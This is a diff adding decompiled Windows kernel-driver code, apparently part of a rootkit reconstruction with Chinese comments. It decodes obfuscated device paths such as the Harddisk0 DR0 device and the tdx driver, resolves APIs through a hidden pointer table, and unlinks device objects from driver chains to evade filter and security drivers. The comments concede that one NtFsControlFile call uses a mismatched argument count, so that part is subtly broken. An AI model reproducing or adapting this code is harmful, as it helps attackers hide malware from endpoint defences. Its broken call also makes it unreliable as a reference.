@@ -3472,3 +3472,300 @@ __int64 ResolveSyscallAddressesInProcess(void)
         KeUnstackDetachProcess(&ApcState);
     return Result;
 }
+char RemoveDeviceObject(__int64 DriverObject)
+{
+    char Result;
+    void (__fastcall *DecodeStringFunc)(_BYTE *, _DWORD *);
+    unsigned int (__fastcall *CreateFileFunc)(_BYTE *, __int64, __int64 *, __int64 *);
+    __int64 CloseHandleFuncPtr;
+    void (__fastcall *CloseHandleFunc)(__int64);
+    __int64 DriverEntry;
+    __int64 DeviceEntry;
+    __int64 CurrentEntry;
+    __int64 FileHandle;
+    _BYTE DevicePath[16];
+    _DWORD EncodedPath[12];
+
+    Result = 0;
+    DecodeStringFunc = (void (__fastcall *)(_BYTE *, _DWORD *))GtRead(GtRtlInitUnicodeStringFunc);
+    CreateFileFunc = (unsigned int (__fastcall *)(_BYTE *, __int64, __int64 *, __int64 *))GtRead(GtCreateFileFunc2);
+    CloseHandleFuncPtr = GtRead(GtCloseHandleFunc);
+    CloseHandleFunc = (void (__fastcall *)(__int64))CloseHandleFuncPtr;
+    if (DecodeStringFunc && CreateFileFunc && CloseHandleFuncPtr)
+    {
+        EncodedPath[0] = 4456540;
+        EncodedPath[1] = 7733349;
+        EncodedPath[2] = 6488169;
+        EncodedPath[3] = 6029413;
+        EncodedPath[4] = 6357064;
+        EncodedPath[5] = 6553714;
+        EncodedPath[6] = 6881380;
+        EncodedPath[7] = 7012467;
+        EncodedPath[8] = 6029360;
+        EncodedPath[9] = 5374020;
+        EncodedPath[10] = 48;
+        DecodeStringFunc(DevicePath, EncodedPath);
+        if (!CreateFileFunc(DevicePath, 128, &FileHandle, &CurrentEntry))
+        {
+            if (GetDeviceObjectFromFileObject(FileHandle, &CurrentEntry, 0))
+            {
+                DriverEntry = CurrentEntry;
+                if (CurrentEntry)
+                {
+                    while (1)
+                    {
+                        DeviceEntry = *(_QWORD *)(DriverEntry + 24);
+                        if (DeviceEntry == DriverObject)
+                            break;
+                        DriverEntry = *(_QWORD *)(DriverEntry + 24);
+                        CurrentEntry = DeviceEntry;
+                        if (!DeviceEntry)
+                            goto LABEL_11;
+                    }
+                    *(_QWORD *)(DriverEntry + 24) = 0;
+                    Result = 1;
+                }
+            }
+LABEL_11:
+            CloseHandleFunc(FileHandle);
+        }
+    }
+    return Result;
+}
+
+
+char RemoveTdxDriverObject(__int64 DriverObject)
+{
+    _DWORD EncodedPath[6];
+
+    EncodedPath[0] = 4456540;
+    EncodedPath[1] = 6881394;
+    EncodedPath[2] = 6619254;
+    EncodedPath[3] = 6029426;
+    EncodedPath[4] = 6553716;
+    EncodedPath[5] = 120;
+    return RemoveObjectListEntry((__int64)EncodedPath, DriverObject);
+}
+
+
+char RemoveHarddiskVolume1Device(__int64 DriverObject)
+{
+    char Result;
+    void (__fastcall *DecodeStringFunc)(_BYTE *, _DWORD *);
+    unsigned int (__fastcall *CreateFileFunc)(_BYTE *, __int64, __int64 *, __int64 *);
+    __int64 CloseHandleFuncPtr;
+    void (__fastcall *CloseHandleFunc)(__int64);
+    __int64 DriverEntry;
+    __int64 DeviceEntry;
+    __int64 CurrentEntry;
+    __int64 FileHandle;
+    _BYTE DevicePath[16];
+    _DWORD EncodedPath[12];
+
+    Result = 0;
+    DecodeStringFunc = (void (__fastcall *)(_BYTE *, _DWORD *))GtRead(GtRtlInitUnicodeStringFunc);
+    CreateFileFunc = (unsigned int (__fastcall *)(_BYTE *, __int64, __int64 *, __int64 *))GtRead(GtCreateFileFunc2);
+    CloseHandleFuncPtr = GtRead(GtCloseHandleFunc);
+    CloseHandleFunc = (void (__fastcall *)(__int64))CloseHandleFuncPtr;
+    if (DecodeStringFunc && CreateFileFunc && CloseHandleFuncPtr)
+    {
+        EncodedPath[0] = 4456540;
+        EncodedPath[1] = 7733349;
+        EncodedPath[2] = 6488169;
+        EncodedPath[3] = 6029413;
+        EncodedPath[4] = 6357064;
+        EncodedPath[5] = 6553714;
+        EncodedPath[6] = 6881380;
+        EncodedPath[7] = 7012467;
+        EncodedPath[8] = 7274582;
+        EncodedPath[9] = 7667820;
+        EncodedPath[10] = 6619245;
+        EncodedPath[11] = 49;
+        DecodeStringFunc(DevicePath, EncodedPath);
+        if (!CreateFileFunc(DevicePath, 128, &FileHandle, &CurrentEntry))
+        {
+            if (GetDeviceObjectFromFileObject(FileHandle, &CurrentEntry, 0))
+            {
+                DriverEntry = CurrentEntry;
+                if (CurrentEntry)
+                {
+                    while (1)
+                    {
+                        DeviceEntry = *(_QWORD *)(DriverEntry + 24);
+                        if (DeviceEntry == DriverObject)
+                            break;
+                        DriverEntry = *(_QWORD *)(DriverEntry + 24);
+                        CurrentEntry = DeviceEntry;
+                        if (!DeviceEntry)
+                            goto LABEL_11;
+                    }
+                    *(_QWORD *)(DriverEntry + 24) = 0;
+                    Result = 1;
+                }
+            }
+LABEL_11:
+            CloseHandleFunc(FileHandle);
+        }
+    }
+    return Result;
+}
+
+
+char RemovePnpManagerDriverObject(__int64 DriverObject)
+{
+    _DWORD EncodedPath[10];
+
+    EncodedPath[9] = 0;
+    EncodedPath[0] = 4456540;
+    EncodedPath[1] = 6881394;
+    EncodedPath[2] = 6619254;
+    EncodedPath[3] = 6029426;
+    EncodedPath[4] = 7209040;
+    EncodedPath[5] = 5046384;
+    EncodedPath[6] = 7209057;
+    EncodedPath[7] = 6750305;
+    EncodedPath[8] = 7471205;
+    return RemoveObjectListEntry((__int64)EncodedPath, DriverObject);
+}
+
+
+__int64 OpenDeviceObjectForEnum(__int64 DeviceContext)
+{
+    // 函数指针：从全局表读取
+    void (__fastcall *RtlInitUnicodeStringFunc)(_BYTE *, _DWORD *);
+    __int64 (__fastcall *CreateFileFunc1)(__int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64);
+    __int64 (__fastcall *NtFsControlFileFunc)(__int64, __int64, __int64, __int64, __int64, __int64);
+    __int64 *pFsControlCode;  // 指向 FSCTL 码的指针
+    void (__fastcall *CloseHandleFunc)(__int64);
+    void (__fastcall *ExFreePoolFunc)(__int64);
+
+    // 局部变量
+    __int64 FileHandle;              // 文件句柄
+    __int64 IoStatusBlock;           // IO_STATUS_BLOCK 输出
+    __int64 DeviceObjectPtr;         // 设备对象指针
+    __int64 ResultInfo;              // Unicode 字符串结果
+    __int64 FsControlCode;           // 从 pFsControlCode 读取的 FSCTL 码
+    ULONG OaLength;                  // OBJECT_ATTRIBUTES.Length
+    ULONG64 OaRootDir;               // OBJECT_ATTRIBUTES.RootDirectory
+    ULONG64 OaObjectName;            // OBJECT_ATTRIBUTES.ObjectName
+    ULONG OaAttributes;              // OBJECT_ATTRIBUTES.Attributes
+    _OWORD IoStatusBlockBuf;         // IO_STATUS_BLOCK 缓冲区
+    ULONG PathBuffer[4];             // 设备路径缓冲区
+    ULONG InitResult;                // InitSystemPath 返回结果
+    BOOLEAN IsMatch;                 // 是否找到匹配
+
+    // 读取函数指针
+    RtlInitUnicodeStringFunc = (void (__fastcall *)(_BYTE *, _DWORD *))GtRead(GtRtlInitUnicodeStringFunc);
+    CreateFileFunc1 = (__int64 (__fastcall *)(__int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64))GtRead(GtCreateFileFunc1);
+    NtFsControlFileFunc = (__int64 (__fastcall *)(__int64, __int64, __int64, __int64, __int64, __int64))GtRead(GtNtFsControlFileFunc);
+    pFsControlCode = (__int64 *)GtRead(GtZwCreateFileFunc);
+    CloseHandleFunc = (void (__fastcall *)(__int64))GtRead(GtCloseHandleFunc);
+    ExFreePoolFunc = (void (__fastcall *)(__int64))GtRead(GtExFreePoolFunc);
+
+    IsMatch = FALSE;
+
+    // 检查所有函数指针非空
+    if (!RtlInitUnicodeStringFunc || !CreateFileFunc1 || !NtFsControlFileFunc ||
+        !pFsControlCode || !CloseHandleFunc || !ExFreePoolFunc)
+    {
+        return FALSE;
+    }
+
+    // 构造设备路径缓冲区：L"\\??\\X:\\"
+    // 初始化为 L"\\??\\C:\\"，稍后通过 InitSystemPath 获取的驱动器号替换 'C'
+    PathBuffer[0] = 0x3F005C;   // L"\\?"  (0x5C='\\', 0x003F='?')
+    PathBuffer[1] = 0x5C003F;   // L"?\\"  (0x003F='?', 0x005C='\\')
+    PathBuffer[2] = 0x3A0043;   // L"C:"   (0x0043='C', 0x003A=':')
+    PathBuffer[3] = 0x5C;       // L"\\"   (0x005C='\\')
+
+    // 获取系统根路径（如 L"C:\\Windows"），提取驱动器号
+    InitResult = (ULONG)InitSystemPath();
+    if (!InitResult)
+    {
+        return FALSE;
+    }
+
+    // 替换路径中的驱动器号（将 PathBuffer[2] 的低 16 位替换为系统盘的驱动器号）
+    ((WORD *)PathBuffer)[4] = *(WORD *)InitResult;
+    ExFreePoolFunc((__int64)InitResult);
+
+    // 初始化 Unicode 字符串
+    RtlInitUnicodeStringFunc((_BYTE *)&ResultInfo, (_DWORD *)PathBuffer);
+
+    // 设置 OBJECT_ATTRIBUTES
+    OaLength = 0x30;                       // sizeof(OBJECT_ATTRIBUTES)
+    OaRootDir = 0;                         // 根目录为空
+    OaAttributes = 0x240;                  // OBJ_CASE_INSENSITIVE
+    OaObjectName = (ULONG64)&ResultInfo;   // 指向 Unicode 字符串
+
+    // 清零 IO_STATUS_BLOCK
+    ((ULONG64 *)&IoStatusBlockBuf)[0] = 0;
+    ((ULONG64 *)&IoStatusBlockBuf)[1] = 0;
+
+    // 调用 CreateFile 打开设备
+    if ((ULONG)CreateFileFunc1(
+        (__int64)&FileHandle,
+        0x100000,                     // DesiredAccess: SYNCHRONIZE
+        (__int64)&OaLength,           // ObjectAttributes
+        (__int64)&IoStatusBlockBuf,   // IoStatusBlock
+        0,                            // AllocationSize
+        0,                            // FileAttributes
+        3,                            // ShareAccess: FILE_SHARE_READ|FILE_SHARE_WRITE
+        0,                            // CreateDisposition: FILE_OPEN
+        0x21,                         // CreateOptions
+        1) != 0)                      // ExtraParameter
+    {
+        CloseHandleFunc(FileHandle);
+        return FALSE;
+    }
+
+    // 读取 FSCTL 码
+    FsControlCode = *pFsControlCode;
+
+    // 调用 NtFsControlFile 获取设备信息
+    // 注意：函数指针类型为 6 参数，实际 NtFsControlFile 有 10 参数
+    // 堆栈上剩余参数位置由调用约定覆盖（未显式传递的参数为未定义值）
+    if ((ULONG)NtFsControlFileFunc(
+        FileHandle,
+        1,                    // Event
+        FsControlCode,        // 第 3 参数（实际为 FSCTL 码，非 ApcRoutine）
+        0,                    // 第 4 参数
+        (__int64)&IoStatusBlock,
+        0) != 0)
+    {
+        CloseHandleFunc(FileHandle);
+        return FALSE;
+    }
+
+    // 从文件对象获取设备对象
+    if (!GetDeviceObjectFromFileObject(IoStatusBlock, (ULONG64 *)&DeviceObjectPtr, NULL))
+    {
+        CloseHandleFunc(FileHandle);
+        return FALSE;
+    }
+
+    // 遍历设备对象链，查找匹配的设备上下文
+    // 原始代码检查 DeviceObject 的 +0x18 偏移处是否等于传入的 DeviceContext
+    while (DeviceObjectPtr)
+    {
+        __int64 *pDeviceObject = (__int64 *)DeviceObjectPtr;
+        __int64 CurrentContext = pDeviceObject[3];  // 偏移 +0x18
+
+        if (CurrentContext == DeviceContext)
+        {
+            // 找到匹配，清除该字段
+            pDeviceObject[3] = 0;
+            IsMatch = TRUE;
+            break;
+        }
+
+        // 移动到链中下一个设备对象
+        DeviceObjectPtr = CurrentContext;
+    }
+
+    // 关闭文件句柄
+    CloseHandleFunc(FileHandle);
+
+    return IsMatch;
+}
+
